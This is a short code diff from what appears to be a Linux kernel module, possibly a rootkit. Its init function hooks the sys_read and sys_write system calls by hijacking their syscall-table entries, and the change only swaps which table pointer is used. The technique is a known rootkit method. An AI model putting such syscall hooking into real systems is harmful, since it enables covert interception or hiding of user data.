@@ -104,10 +104,10 @@ void hookrw_init ( void )
 {
     DEBUG("Hooking sys_read and sys_write\n");
 
-    sys_read = (void *)sys_call_table[__NR_read];
+    sys_read = (void *)my_sys_call_table[__NR_read];
     hijack_start(sys_read, &n_sys_read);
 
-    sys_write = (void *)sys_call_table[__NR_write];
+    sys_write = (void *)my_sys_call_table[__NR_write];
     hijack_start(sys_write, &n_sys_write);
 }
 
